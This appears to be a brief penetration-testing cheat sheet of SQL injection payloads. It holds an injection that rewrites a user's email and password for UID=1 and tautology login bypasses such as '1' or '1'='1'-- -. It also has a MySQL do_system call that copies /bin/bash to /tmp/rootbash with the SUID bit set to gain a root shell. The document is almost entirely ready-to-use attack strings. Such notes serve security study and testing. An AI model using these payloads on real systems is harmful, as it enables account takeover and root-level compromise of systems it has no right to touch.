# SQL 

## Simple injection

Exemple : 
```bash=
    Example : 
        asd',nickName='testnickname',email='hacked', password='password' where UID=1--```
        1' or '1'='1'-- -
        1 or 1=1-- -
```
## MYSQL

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```bash=
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```